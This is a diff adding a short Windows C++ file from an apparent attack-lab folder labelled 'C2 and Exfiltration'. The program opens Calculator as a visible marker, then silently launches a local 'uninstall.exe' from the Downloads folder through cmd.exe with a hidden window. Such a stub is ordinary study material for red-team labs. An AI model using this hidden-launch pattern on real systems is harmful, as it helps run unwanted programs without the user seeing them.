@@ -1,0 +1,26 @@
+---
+title: "Główny Plik"
+folder: "Całe Ataki/3. C2 and Exfiltration"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+void OpenCalc() {
+    if (ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\calc.exe", NULL, NULL, SW_SHOWNORMAL) <= (HINSTANCE)32) {}
+}
+
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    OpenCalc();
+    ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\cmd.exe", L"/c C:\\Users\\User\\Downloads\\uninstall.exe", NULL, 0);
+
+    
+    return 0;
+}
